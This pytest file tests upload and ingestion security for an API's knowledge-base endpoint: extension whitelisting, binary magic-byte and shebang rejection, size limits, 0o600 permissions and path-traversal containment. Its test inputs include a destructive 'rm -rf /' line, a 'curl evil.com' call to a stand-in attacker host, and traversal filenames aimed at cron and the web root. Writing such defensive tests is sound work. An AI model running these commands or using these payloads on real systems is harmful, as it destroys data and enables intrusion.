"""
tests/test_file_upload_security.py — Rule 16: File upload and ingestion security.

Verifies:
1. Server-side file type and extension whitelisting (.md, .txt, .json, .csv).
2. Server-side binary executable and script inspection (ELF, PE, zip, shebangs).
3. Payload and file size limits (enforced at API and loader levels).
4. Non-executable storage mode:
   - Saved files have 0o600 (-rw-------, non-executable) permissions.
   - Directory permissions restricted to 0o700.
   - Files stored strictly outside the public web root (frontend/dist/).
5. Directory traversal and path containment defenses.
"""
from __future__ import annotations

import os
import stat
from pathlib import Path

import httpx
import pytest
import pytest_asyncio

import config
from api import db
from api.main import app
from knowledge_base import loader

TOKEN = "test-operator-token-rule16"


@pytest_asyncio.fixture
async def sec_env(tmp_path, monkeypatch):
    config.DB_PATH = tmp_path / "test_sec.db"
    monkeypatch.setattr(config, "ADMIN_TOKEN", TOKEN)
    monkeypatch.setattr(config, "INGESTED_KNOWLEDGE_DIR", tmp_path / "kb_ingest")
    monkeypatch.setattr(config, "SESSION_COOKIE_NAME", "admin_session")
    monkeypatch.setattr(config, "DATA_BACKEND", "mock")
    await db.init_db()
    yield


@pytest_asyncio.fixture
async def client(sec_env):
    from data_providers.mock import MockProvider
    from llm.narrator import Narrator

    app.state.provider = MockProvider()
    app.state.narrator = Narrator()
    transport = httpx.ASGITransport(app=app)
    async with httpx.AsyncClient(
        transport=transport, base_url="http://127.0.0.1"
    ) as c:
        yield c


# ---------------------------------------------------------------------------
# 1. Server-Side Extension Whitelist Tests (API & Gateway)
# ---------------------------------------------------------------------------

@pytest.mark.asyncio
@pytest.mark.parametrize("disallowed_filename", [
    "payload.py",
    "exploit.sh",
    "shell.php",
    "malware.exe",
    "library.so",
    "script.bin",
    "app.jar",
    "noextension",
    "test.html",
    "test.svg",
])
async def test_api_rejects_disallowed_file_extensions(client, disallowed_filename):
    """Confirm the API rejects non-whitelisted extensions with HTTP 422."""
    r = await client.post(
        "/api/knowledge-base/ingest",
        json={"documents": [{"filename": disallowed_filename, "content": "Sample content"}]},
        headers={"X-Admin-Token": TOKEN},
    )
    assert r.status_code == 422
    assert "not permitted" in r.text


@pytest.mark.asyncio
@pytest.mark.parametrize("allowed_filename", [
    "strategy_notes.md",
    "market_summary.txt",
    "sentiment_feed.json",
    "tick_history.csv",
])
async def test_api_accepts_whitelisted_file_extensions(client, allowed_filename, tmp_path, monkeypatch):
    """Confirm the API accepts allowed knowledge extensions (.md, .txt, .json, .csv)."""
    monkeypatch.setattr(config, "INGESTED_KNOWLEDGE_DIR", tmp_path / "ingested")
    r = await client.post(
        "/api/knowledge-base/ingest",
        json={"documents": [{"filename": allowed_filename, "content": "Valid trading knowledge body"}]},
        headers={"X-Admin-Token": TOKEN},
    )
    assert r.status_code == 200
    data = r.json()
    assert len(data["ingested"]) == 1
    assert len(data["errors"]) == 0


# ---------------------------------------------------------------------------
# 2. Executable Content & Magic Byte Inspection
# ---------------------------------------------------------------------------

@pytest.mark.asyncio
@pytest.mark.parametrize("magic_bytes,description", [
    (b"\x7fELF\x02\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00", "Linux ELF binary"),
    (b"MZ\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00\xff\xff\x00\x00", "Windows PE binary"),
    (b"\xca\xfe\xba\xbe\x00\x00\x00\x32", "Java class / Mach-O universal"),
    (b"PK\x03\x04\x14\x00\x00\x00\x08\x00", "ZIP archive"),
    (b"\x1f\x8b\x08\x00\x00\x00\x00\x00", "GZIP compressed archive"),
    (b"7z\xbc\xaf\x27\x1c\x00\x04", "7-Zip archive"),
    (b"Rar!\x1a\x07\x00\xcf\x90\x73", "RAR archive"),
])
async def test_api_rejects_binary_executables_even_with_allowed_extension(client, magic_bytes, description):
    """Confirm binary executable magic byte signatures are rejected at API boundary."""
    content = magic_bytes.decode("latin-1")
    r = await client.post(
        "/api/knowledge-base/ingest",
        json={"documents": [{"filename": "trojan.txt", "content": content}]},
        headers={"X-Admin-Token": TOKEN},
    )
    assert r.status_code == 422
    assert "binary executable" in r.text.lower()


@pytest.mark.asyncio
@pytest.mark.parametrize("shebang_header", [
    "#!/bin/bash\nrm -rf /",
    "#!/bin/sh\necho pwned",
    "#!/usr/bin/env bash\ncurl evil.com",
    "#!/usr/bin/env python3\nimport os; os.system('id')",
])
async def test_api_rejects_executable_scripts_even_with_allowed_extension(client, shebang_header):
    """Confirm executable script shebang headers are rejected at API boundary."""
    r = await client.post(
        "/api/knowledge-base/ingest",
        json={"documents": [{"filename": "notes.md", "content": shebang_header}]},
        headers={"X-Admin-Token": TOKEN},
    )
    assert r.status_code == 422
    assert "executable scripts are not permitted" in r.text.lower()


# ---------------------------------------------------------------------------
# 3. Size Limits Enforced on Server
# ---------------------------------------------------------------------------

@pytest.mark.asyncio
async def test_api_rejects_payload_exceeding_max_ingest_chars(client, monkeypatch):
    """Confirm content exceeding MAX_INGEST_CHARS is rejected on the server."""
    monkeypatch.setattr(config, "MAX_INGEST_CHARS", 500)
    oversized = "A" * 501
    r = await client.post(
        "/api/knowledge-base/ingest",
        json={"documents": [{"filename": "large.md", "content": oversized}]},
        headers={"X-Admin-Token": TOKEN},
    )
    assert r.status_code == 422
    assert "exceeds maximum allowed size" in r.text


@pytest.mark.asyncio
async def test_loader_rejects_oversized_file_directly(tmp_path, monkeypatch):
    """Confirm loader.ingest_file rejects oversized files even if invoked outside API."""
    monkeypatch.setattr(config, "MAX_INGEST_CHARS", 250)
    monkeypatch.setattr(config, "INGESTED_KNOWLEDGE_DIR", tmp_path / "ingested")
    with pytest.raises(ValueError, match="too large"):
        await loader.ingest_file("overflow.txt", "x" * 251)


# ---------------------------------------------------------------------------
# 4. Storage Location & Non-Executable Permission Verification
# ---------------------------------------------------------------------------

@pytest.mark.asyncio
async def test_ingested_file_permissions_are_non_executable(tmp_path, monkeypatch):
    """
    Verify that files saved to disk:
    1. Are created with 0o600 permissions (-rw-------).
    2. Have NO execute bit for owner, group, or world.
    3. Storage directory is restricted to 0o700.
    """
    target_dir = tmp_path / "secure_ingested"
    monkeypatch.setattr(config, "INGESTED_KNOWLEDGE_DIR", target_dir)

    result = await loader.ingest_file("alpha_vantage_guide.md", "# Alpha Vantage Guide\nAPI docs here.")
    stored_path = target_dir / result["filename"]

    assert stored_path.exists()

    # Check directory permissions (0o700)
    dir_mode = stat.S_IMODE(os.stat(target_dir).st_mode)
    assert dir_mode == 0o700, f"Expected dir mode 0o700, got octal {oct(dir_mode)}"

    # Check file permissions (0o600)
    file_mode = stat.S_IMODE(os.stat(stored_path).st_mode)
    assert file_mode == 0o600, f"Expected file mode 0o600, got octal {oct(file_mode)}"

    # Explicitly confirm no execution bits are set anywhere
    assert not (file_mode & stat.S_IXUSR), "Execute bit set for user"
    assert not (file_mode & stat.S_IXGRP), "Execute bit set for group"
    assert not (file_mode & stat.S_IXOTH), "Execute bit set for others"


def test_storage_location_is_outside_web_root():
    """Verify that INGESTED_KNOWLEDGE_DIR is strictly outside the public web root (frontend/dist)."""
    ingested_dir = config.INGESTED_KNOWLEDGE_DIR.resolve()
    frontend_dist = (config.BASE_DIR.parent / "frontend" / "dist").resolve()

    # Ingested dir must not be inside frontend dist
    assert not ingested_dir.is_relative_to(frontend_dist)
    # Frontend dist must not be inside ingested dir
    assert not frontend_dist.is_relative_to(ingested_dir)


# ---------------------------------------------------------------------------
# 5. Path Traversal & Containment Defenses
# ---------------------------------------------------------------------------

@pytest.mark.asyncio
async def test_path_traversal_sanitization_and_containment(tmp_path, monkeypatch):
    """
    Verify that path traversal characters (../, absolute paths) are sanitized
    and files are strictly contained within INGESTED_KNOWLEDGE_DIR.
    """
    target_dir = tmp_path / "ingested_containment"
    monkeypatch.setattr(config, "INGESTED_KNOWLEDGE_DIR", target_dir)

    malicious_names = [
        "../../etc/cron.d/backdoor.md",
        "..\\..\\windows\\system32\\calc.txt",
        "/var/www/html/shell.json",
        "nested/sub/path.csv",
    ]

    for mal_name in malicious_names:
        result = await loader.ingest_file(mal_name, "Safe trading note content")
        saved_file = target_dir / result["filename"]
        # Must exist directly under target_dir
        assert saved_file.exists()
        assert saved_file.parent.resolve() == target_dir.resolve()
        assert saved_file.resolve().is_relative_to(target_dir.resolve())


# ---------------------------------------------------------------------------
# 6. Bulk Ingest CLI Integration
# ---------------------------------------------------------------------------

def test_ingest_directory_script_uses_allowed_extensions():
    """Verify scripts/ingest_directory.py imports and respects ALLOWED_EXTENSIONS."""
    from scripts import ingest_directory
    assert ingest_directory.SUPPORTED == loader.ALLOWED_EXTENSIONS
    assert ".md" in ingest_directory.SUPPORTED
    assert ".txt" in ingest_directory.SUPPORTED
    assert ".json" in ingest_directory.SUPPORTED
    assert ".csv" in ingest_directory.SUPPORTED
    assert ".py" not in ingest_directory.SUPPORTED
    assert ".sh" not in ingest_directory.SUPPORTED

